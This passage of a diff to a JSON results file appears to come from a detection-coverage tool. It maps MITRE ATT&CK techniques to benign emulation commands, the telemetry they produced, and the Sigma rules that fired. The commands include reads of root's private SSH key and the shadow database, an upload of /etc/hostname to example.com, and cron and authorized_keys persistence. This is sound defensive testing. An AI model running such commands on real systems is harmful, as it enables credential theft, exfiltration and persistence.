+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1053.003",
@@ -996,7 +3187,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "6b14bac8-3e3a-4324-8109-42f0546a347f"
+        "rule": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+        "detail": {
+          "command": "printf '* * * * * /bin/true\\n' > /tmp/rgcron && crontab /tmp/rgcron || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c printf '* * * * * /bin/true\\n' > /tmp/rgcron && crontab /tmp/rgcron || true"
+            },
+            {
+              "image": "/usr/bin/crontab",
+              "cmd": "crontab /tmp/rgcron"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c crontab -r 2>/dev/null; rm -f /tmp/rgcron; true"
+            },
+            {
+              "image": "/usr/bin/crontab",
+              "cmd": "crontab -r"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgcron"
+            }
+          ],
+          "rule_title": "Scheduled Cron Task/Job - Linux",
+          "rule_id": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_schedule_task_job_cron.yml",
+          "matched": {
+            "CommandLine": "crontab /tmp/rgcron",
+            "Image": "/usr/bin/crontab"
+          },
+          "why": "'Scheduled Cron Task/Job - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1053.002",
@@ -1008,18 +3232,95 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "d2d642d7-b393-43fe-bae4-e81ed5915c4b"
+        "rule": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+        "detail": {
+          "command": "echo /bin/true | at now + 1 hour || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c echo /bin/true | at now + 1 hour || true"
+            },
+            {
+              "image": "/usr/bin/at",
+              "cmd": "at now + 1 hour"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c atq | cut -f1 | xargs -r atrm; true"
+            },
+            {
+              "image": "/usr/bin/at",
+              "cmd": "atq"
+            },
+            {
+              "image": "/usr/bin/xargs",
+              "cmd": "xargs -r atrm"
+            },
+            {
+              "image": "/usr/bin/cut",
+              "cmd": "cut -f1"
+            },
+            {
+              "image": "/usr/bin/at",
+              "cmd": "atrm 1"
+            }
+          ],
+          "rule_title": "Scheduled Task/Job At",
+          "rule_id": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_at_command.yml",
+          "matched": {
+            "Image": "/usr/bin/at"
+          },
+          "why": "'Scheduled Task/Job At' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1548",
         "name": "Abuse Elevation Control Mechanism",
         "tactics": [
           "Privilege Escalation",
-          "Persistence"
+          "Defense Evasion"
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "ed447910-bc30-4575-a598-3a2e49516a7a"
+        "rule": "ed447910-bc30-4575-a598-3a2e49516a7a",
+        "detail": {
+          "command": "cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /bin/true /tmp/rgcap"
+            },
+            {
+              "image": "/usr/sbin/setcap",
+              "cmd": "setcap cap_setuid+ep /tmp/rgcap"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c setcap -r /tmp/rgcap 2>/dev/null; rm -f /tmp/rgcap; true"
+            },
+            {
+              "image": "/usr/sbin/setcap",
+              "cmd": "setcap -r /tmp/rgcap"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgcap"
+            }
+          ],
+          "rule_title": "Linux Setuid Capability Set on a Binary via Setcap Utility",
+          "rule_id": "ed447910-bc30-4575-a598-3a2e49516a7a",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_cap_setuid.yml",
+          "matched": {
+            "CommandLine": "setcap cap_setuid+ep /tmp/rgcap",
+            "Image": "/usr/sbin/setcap"
+          },
+          "why": "'Linux Setuid Capability Set on a Binary via Setcap Utility' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1546.004",
@@ -1030,7 +3331,37 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "cp -n /root/.bashrc /root/.bashrc.rgbak; printf '# redgap-benign-test\\n' | tee -a /root/.bashrc >/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp -n /root/.bashrc /root/.bashrc.rgbak; printf '# redgap-benign-test\\n' | tee -a /root/.bashrc >/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp -n /root/.bashrc /root/.bashrc.rgbak"
+            },
+            {
+              "image": "/usr/bin/tee",
+              "cmd": "tee -a /root/.bashrc"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c mv -f /root/.bashrc.rgbak /root/.bashrc 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/bin/mv",
+              "cmd": "mv -f /root/.bashrc.rgbak /root/.bashrc"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1098.004",
@@ -1038,9 +3369,46 @@
         "tactics": [
           "Persistence"
         ],
-        "detected": false,
-        "gap_type": "rule",
-        "rule": ""
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000003",
+        "detail": {
+          "command": "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\\n' | tee -a /root/.ssh/authorized_keys >/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\\n' | tee -a /root/.ssh/authorized_keys >/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/mkdir",
+              "cmd": "mkdir -p /root/.ssh"
+            },
+            {
+              "image": "/usr/bin/tee",
+              "cmd": "tee -a /root/.ssh/authorized_keys"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c sed -i '/redgap-benign-test/d' /root/.ssh/authorized_keys 2>/dev/null; rmdir --ignore-fail-on-non-empty /root/.ssh 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/bin/sed",
+              "cmd": "sed -i /redgap-benign-test/d /root/.ssh/authorized_keys"
+            },
+            {
+              "image": "/usr/bin/rmdir",
+              "cmd": "rmdir --ignore-fail-on-non-empty /root/.ssh"
+            }
+          ],
+          "rule_title": "SSH authorized_keys Modification",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000003",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "tee -a /root/.ssh/authorized_keys",
+            "Image": "/usr/bin/tee"
+          },
+          "why": "'SSH authorized_keys Modification' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1552.001",
@@ -1050,7 +3418,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba"
+        "rule": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+        "detail": {
+          "command": "touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch /tmp/shadow"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /tmp/shadow /tmp/shadow.bak"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/shadow /tmp/shadow.bak"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/shadow /tmp/shadow.bak"
+            }
+          ],
+          "rule_title": "Copy Passwd Or Shadow From TMP Path",
+          "rule_id": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml",
+          "matched": {
+            "CommandLine": "cp /tmp/shadow /tmp/shadow.bak",
+            "Image": "/usr/bin/cp"
+          },
+          "why": "'Copy Passwd Or Shadow From TMP Path' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1003.008",
@@ -1058,9 +3459,34 @@
         "tactics": [
           "Credential Access"
         ],
-        "detected": false,
-        "gap_type": "rule",
-        "rule": ""
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000004",
+        "detail": {
+          "command": "getent shadow || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c getent shadow || true"
+            },
+            {
+              "image": "/usr/bin/getent",
+              "cmd": "getent shadow"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Shadow Database Read via getent",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000004",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "getent shadow",
+            "Image": "/usr/bin/getent"
+          },
+          "why": "'Shadow Database Read via getent' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1552.004",
@@ -1068,9 +3494,34 @@
         "tactics": [
           "Credential Access"
         ],
-        "detected": false,
-        "gap_type": "rule",
-        "rule": ""
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000005",
+        "detail": {
+          "command": "cat /root/.ssh/id_rsa 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /root/.ssh/id_rsa 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /root/.ssh/id_rsa"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Private Key Read (id_rsa)",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000005",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "cat /root/.ssh/id_rsa",
+            "Image": "/usr/bin/cat"
+          },
+          "why": "'Private Key Read (id_rsa)' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1560.001",
@@ -1078,9 +3529,46 @@
         "tactics": [
           "Collection"
         ],
-        "detected": false,
-        "gap_type": "rule",
-        "rule": ""
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000006",
+        "detail": {
+          "command": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/tar",
+              "cmd": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "/bin/sh -c gzip"
+            },
+            {
+              "image": "/usr/bin/gzip",
+              "cmd": "gzip"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/rg_loot.tgz"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rg_loot.tgz"
+            }
+          ],
+          "rule_title": "Archive via tar",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000006",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release",
+            "Image": "/usr/bin/tar"
+          },
+          "why": "'Archive via tar' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1005",
@@ -1090,7 +3578,29 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "cat /etc/hostname || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /etc/hostname || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /etc/hostname"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1071.001",
@@ -1100,7 +3610,32 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "b86d356d-6093-443d-971c-9b07db583c68"
+        "rule": "b86d356d-6093-443d-971c-9b07db583c68",
+        "detail": {
+          "command": "curl -A 'RedGap/1.0' http://example.com/ || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c curl -A 'RedGap/1.0' http://example.com/ || true"
+            },
+            {
+              "image": "/usr/bin/curl",
+              "cmd": "curl -A RedGap/1.0 http://example.com/"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Suspicious Curl Change User Agents - Linux",
+          "rule_id": "b86d356d-6093-443d-971c-9b07db583c68",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_curl_useragent.yml",
+          "matched": {
+            "CommandLine": "curl -A RedGap/1.0 http://example.com/",
+            "Image": "/usr/bin/curl"
+          },
+          "why": "'Suspicious Curl Change User Agents - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1090",
@@ -1110,18 +3645,70 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c"
+        "rule": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+        "detail": {
+          "command": "env http_proxy=http://127.0.0.1:3128 true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c env http_proxy=http://127.0.0.1:3128 true"
+            },
+            {
+              "image": "/usr/bin/env",
+              "cmd": "env http_proxy=http://127.0.0.1:3128 true"
+            },
+            {
+              "image": "/usr/bin/true",
+              "cmd": "true"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Connection Proxy",
+          "rule_id": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_proxy_connection.yml",
+          "matched": {
+            "CommandLine": "sh -c env http_proxy=http://127.0.0.1:3128 true"
+          },
+          "why": "'Connection Proxy' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1567",
         "name": "Exfiltration Over Web Service",
         "tactics": [
-          "Exfiltration",
-          "Command and Control"
+          "Exfiltration"
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "00b90cc1-17ec-402c-96ad-3a8117d7a582"
+        "rule": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+        "detail": {
+          "command": "curl --upload-file /etc/hostname http://example.com/ || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c curl --upload-file /etc/hostname http://example.com/ || true"
+            },
+            {
+              "image": "/usr/bin/curl",
+              "cmd": "curl --upload-file /etc/hostname http://example.com/"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Suspicious Curl File Upload - Linux",
+          "rule_id": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_curl_fileupload.yml",
+          "matched": {
+            "CommandLine": "curl --upload-file /etc/hostname http://example.com/",
+            "Image": "/usr/bin/curl"
+          },
+          "why": "'Suspicious Curl File Upload - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1048.003",
@@ -1131,7 +3718,36 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "3f0f5957-04f8-4792-ad89-192b0303bde6"
+        "rule": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+        "detail": {
+          "command": "timeout 3 python3 -m http.server 8000 || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c timeout 3 python3 -m http.server 8000 || true"
+            },
+            {
+              "image": "/usr/bin/timeout",
+              "cmd": "timeout 3 python3 -m http.server 8000"
+            },
+            {
+              "image": "/usr/bin/python3.13",
+              "cmd": "python3 -m http.server 8000"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Python WebServer Execution - Linux",
+          "rule_id": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_python_http_server_execution.yml",
+          "matched": {
+            "CommandLine": "python3 -m http.server 8000",
+            "Image": "/usr/bin/python3.13"
+          },
+          "why": "'Python WebServer Execution - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1485",
@@ -1141,7 +3757,36 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "2953194b-e33c-4859-b9e8-05948c167447"
+        "rule": "2953194b-e33c-4859-b9e8-05948c167447",
+        "detail": {
+          "command": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1"
+            },
+            {
+              "image": "/usr/bin/dd",
+              "cmd": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_wipe"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_wipe"
+            }
+          ],
+          "rule_title": "DD File Overwrite",
+          "rule_id": "2953194b-e33c-4859-b9e8-05948c167447",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_dd_file_overwrite.yml",
+          "matched": {
+            "CommandLine": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
+            "Image": "/usr/bin/dd"
+          },
+          "why": "'DD File Overwrite' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1489",
@@ -1151,18 +3796,71 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "de25eeb8-3655-4643-ac3a-b662d3f26b6b"
+        "rule": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+        "detail": {
+          "command": "systemctl stop redgap-nonexistent.service || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c systemctl stop redgap-nonexistent.service || true"
+            },
+            {
+              "image": "/usr/bin/systemctl",
+              "cmd": "systemctl stop redgap-nonexistent.service"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Disable Or Stop Services",
+          "rule_id": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_services_stop_and_disable.yml",
+          "matched": {
+            "CommandLine": "systemctl stop redgap-nonexistent.service",
+            "Image": "/usr/bin/systemctl"
+          },
+          "why": "'Disable Or Stop Services' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1653",
         "name": "Power Settings",
         "tactics": [
-          "Persistence",
-          "Impact"
+          "Persistence"
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "c172b7b5-f3a1-4af2-90b7-822c63df86cb"
+        "rule": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+        "detail": {
+          "command": "systemctl mask hibernate.target || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c systemctl mask hibernate.target || true"
+            },
+            {
+              "image": "/usr/bin/systemctl",
+              "cmd": "systemctl mask hibernate.target"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c systemctl unmask hibernate.target 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/bin/systemctl",
+              "cmd": "systemctl unmask hibernate.target"
+            }
+          ],
+          "rule_title": "Mask System Power Settings Via Systemctl",
+          "rule_id": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_systemctl_mask_power_settings.yml",
+          "matched": {
+            "CommandLine": "systemctl mask hibernate.target",
+            "Image": "/usr/bin/systemctl"
+          },
+          "why": "'Mask System Power Settings Via Systemctl' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1565.001",
@@ -1172,7 +3870,32 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "86157017-c2b1-4d4a-8c33-93b8e67e4af4"
+        "rule": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+        "detail": {
+          "command": "sed -n '1p' /etc/hosts || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c sed -n '1p' /etc/hosts || true"
+            },
+            {
+              "image": "/usr/bin/sed",
+              "cmd": "sed -n 1p /etc/hosts"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Potential Suspicious Change To Sensitive/Critical Files",
+          "rule_id": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_sensitive_file_access.yml",
+          "matched": {
+            "CommandLine": "sed -n 1p /etc/hosts",
+            "Image": "/usr/bin/sed"
+          },
+          "why": "'Potential Suspicious Change To Sensitive/Critical Files' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1592.004",
@@ -1182,7 +3905,508 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "0f79c4d2-4e1f-4683-9c36-b5469a665e06"
+        "rule": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+        "detail": {
+          "command": "grep root /etc/sudoers || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c grep root /etc/sudoers || true"
+            },
+            {
+              "image": "/usr/bin/grep",
+              "cmd": "grep root /etc/sudoers"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Access of Sudoers File Content",
+          "rule_id": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_process_reading_sudoers.yml",
+          "matched": {
+            "CommandLine": "grep root /etc/sudoers",
+            "Image": "/usr/bin/grep"
+          },
+          "why": "'Access of Sudoers File Content' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1007",
+        "name": "System Service Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+        "detail": {
+          "command": "crontab -l 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c crontab -l 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/crontab",
+              "cmd": "crontab -l"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Crontab Enumeration",
+          "rule_id": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_crontab_enumeration.yml",
+          "matched": {
+            "CommandLine": "crontab -l",
+            "Image": "/usr/bin/crontab"
+          },
+          "why": "'Crontab Enumeration' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1049",
+        "name": "System Network Connections Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+        "detail": {
+          "command": "who",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c who"
+            },
+            {
+              "image": "/usr/bin/who",
+              "cmd": "who"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Network Connections Discovery - Linux",
+          "rule_id": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_system_network_connections_discovery.yml",
+          "matched": {
+            "Image": "/usr/bin/who"
+          },
+          "why": "'System Network Connections Discovery - Linux' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+        "detail": {
+          "command": "echo cmVkZ2Fw | base64 -d",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c echo cmVkZ2Fw | base64 -d"
+            },
+            {
+              "image": "/usr/bin/base64",
+              "cmd": "base64 -d"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Decode Base64 Encoded Text",
+          "rule_id": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_base64_decode.yml",
+          "matched": {
+            "CommandLine": "base64 -d",
+            "Image": "/usr/bin/base64"
+          },
+          "why": "'Decode Base64 Encoded Text' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1036",
+        "name": "Masquerading",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "312b42b1-bded-4441-8b58-163a3af58775",
+        "detail": {
+          "command": "cp /bin/true /tmp/rgmasq && /tmp/rgmasq",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /bin/true /tmp/rgmasq && /tmp/rgmasq"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /bin/true /tmp/rgmasq"
+            },
+            {
+              "image": "/tmp/rgmasq",
+              "cmd": "/tmp/rgmasq"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/rgmasq"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgmasq"
+            }
+          ],
+          "rule_title": "Potentially Suspicious Execution From Tmp Folder",
+          "rule_id": "312b42b1-bded-4441-8b58-163a3af58775",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_execution_tmp_folder.yml",
+          "matched": {
+            "Image": "/tmp/rgmasq"
+          },
+          "why": "'Potentially Suspicious Execution From Tmp Folder' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1055.009",
+        "name": "Process Injection: Proc Memory",
+        "tactics": [
+          "Defense Evasion",
+          "Privilege Escalation"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+        "detail": {
+          "command": "dd if=/dev/null of=/proc/self/mem 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dd if=/dev/null of=/proc/self/mem 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/dd",
+              "cmd": "dd if=/dev/null of=/proc/self/mem"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Potential Linux Process Code Injection Via DD Utility",
+          "rule_id": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_dd_process_injection.yml",
+          "matched": {
+            "CommandLine": "dd if=/dev/null of=/proc/self/mem",
+            "Image": "/usr/bin/dd"
+          },
+          "why": "'Potential Linux Process Code Injection Via DD Utility' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1070",
+        "name": "Indicator Removal",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+        "detail": {
+          "command": "dpkg --remove redgap-nonexistent 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dpkg --remove redgap-nonexistent 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/dpkg",
+              "cmd": "dpkg --remove redgap-nonexistent"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Linux Package Uninstall",
+          "rule_id": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_remove_package.yml",
+          "matched": {
+            "CommandLine": "dpkg --remove redgap-nonexistent",
+            "Image": "/usr/bin/dpkg"
+          },
+          "why": "'Linux Package Uninstall' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactics": [
+          "Command and Control"
